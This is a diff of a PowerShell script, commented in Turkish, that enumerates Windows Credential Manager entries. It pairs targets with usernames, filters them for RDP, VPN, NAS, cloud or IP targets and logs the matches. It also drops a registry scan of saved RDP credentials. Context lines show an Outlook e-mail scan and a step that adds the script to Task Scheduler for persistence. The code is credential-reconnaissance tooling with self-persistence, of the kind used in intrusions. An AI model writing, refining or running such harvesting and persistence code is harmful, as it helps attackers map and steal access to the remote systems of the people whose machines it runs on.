@@ -33,33 +33,46 @@ try {
     Add-Content -Path $LogFile -Value "[ERROR] Outlook e-posta taramasında hata: $_"
 }
 
-# 2️⃣ Credential Manager (cmdkey ile hedefler - doğru şekilde)
+# 2️⃣ Credential Manager (cmdkey target + username eşleştirmesi)
 try {
-    $targets = cmdkey /list | Where-Object { $_ -match "^Target:" } | ForEach-Object {
-        ($_ -split "Target:")[1].Trim()
+    $entries = cmdkey /list
+    $blocks = @()
+    $currentBlock = @()
+
+    foreach ($line in $entries) {
+        if ($line -match "^\s*$" -and $currentBlock.Count -gt 0) {
+            $blocks += ,@($currentBlock)
+            $currentBlock = @()
+        } else {
+            $currentBlock += $line
+        }
     }
 
-    foreach ($target in $targets) {
-        if ($target -match "\d+\.\d+\.\d+\.\d+" -or $target -match "nas|term|cloud|vpn|rdp|file|srv|auth|sso|domain|host|TERMSRV") {
-            Add-Content -Path $LogFile -Value "[CREDENTIAL] Target found: $target"
+    if ($currentBlock.Count -gt 0) {
+        $blocks += ,@($currentBlock)
+    }
+
+    foreach ($block in $blocks) {
+        $target = $null
+        $user = $null
+
+        foreach ($line in $block) {
+            if ($line -match "Target:\s*(.+)") {
+                $target = $Matches[1].Trim()
+            }
+            if ($line -match "User:\s*(.+)") {
+                $user = $Matches[1].Trim()
+            }
+        }
+
+        if ($target -match "TERMSRV|nas|vpn|rdp|cloud|\d+\.\d+\.\d+\.\d+" -and $user) {
+            Add-Content -Path $LogFile -Value "[CREDENTIAL] $target username: $user"
         }
     }
 } catch {
     Add-Content -Path $LogFile -Value "[ERROR] cmdkey Credential taramasında hata: $_"
 }
 
-# 3️⃣ Credential Registry (TERMSRV/RDP gibi kayıtları registry'den al)
-try {
-    $RegPaths = Get-ChildItem -Path "HKCU:\Software\Microsoft\CredUI\CredPersisted" -ErrorAction SilentlyContinue
-    foreach ($item in $RegPaths) {
-        $keyName = $item.PSChildName
-        if ($keyName -match "TERMSRV|nas|vpn|cloud|rdp|sso|domain|\d+\.\d+\.\d+\.\d+") {
-            Add-Content -Path $LogFile -Value "[CREDENTIAL-RDP] Saved Key: $keyName"
-        }
-    }
-} catch {
-    Add-Content -Path $LogFile -Value "[ERROR] Registry Credential taramasında hata: $_"
-}
 
 # 4️⃣ Görev zamanlayıcıya kendini ekle
 try {
